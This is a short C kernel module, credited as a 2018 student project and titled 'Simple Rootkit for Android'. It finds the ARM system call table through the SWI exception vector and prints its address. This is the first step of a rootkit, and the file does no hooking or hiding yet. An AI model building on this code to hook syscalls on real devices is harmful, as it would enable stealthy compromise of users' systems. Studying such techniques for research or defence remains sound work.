/*
  Hadrien Amrouche, Nicolas Grellety, Bowen Liu, Roland Mounier
  
  (c) 2018

  End of studies' project based on "Android platform based linux kernel rootkit".
*/

#include <linux/kernel.h>
#include <linux/module.h>

unsigned long *sys_call_table = 0;

void 
get_sys_call_table()
{
  void *swi_addr = (long *)0xffff0008;
	unsigned long offset = 0;
	unsigned long *vector_swi_addr = 0;

	offset = ((*(long *)swi_addr) & 0xfff) + 8;
	vector_swi_addr = *(unsigned long *)(swi_addr + offset);

	while (vector_swi_addr++)
  {
		if (((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000)
    {
			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
			sys_call_table = (void *)vector_swi_addr + offset;
      printk(KERN_INFO "syscall table found at %p\n", sys_call_table);
			break;
		}
	}
	return;
}

static int __init
root_start(void) 
{
  printk(KERN_INFO "Hello word!\n");
  get_sys_call_table();
  return 0;
}

static int __exit
root_stop(void)
{
  printk(KERN_INFO "Goodbye!\n");
  return 0;
}

module_init(root_start);
module_exit(root_stop);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Master CSI");
MODULE_DESCRIPTION("Simple Rootkit for Android");

